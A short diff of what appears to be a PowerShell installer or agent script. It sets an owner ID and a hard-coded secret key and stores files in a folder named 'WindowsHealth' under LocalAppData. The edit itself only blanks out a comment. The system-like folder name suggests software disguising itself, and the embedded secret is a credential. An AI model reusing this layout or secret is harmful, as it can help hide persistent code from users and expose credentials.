@@ -6,7 +6,7 @@ $OwnerID = "W404AorT6U"
 $Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
 $Version = "1.0"
 
-# Use a more accessible path for stability
+# **********************
 $dirPath    = "$env:LOCALAPPDATA\WindowsHealth"
 $configPath = "$dirPath\auth.dat"
 $scriptPath = "$dirPath\service.ps1"
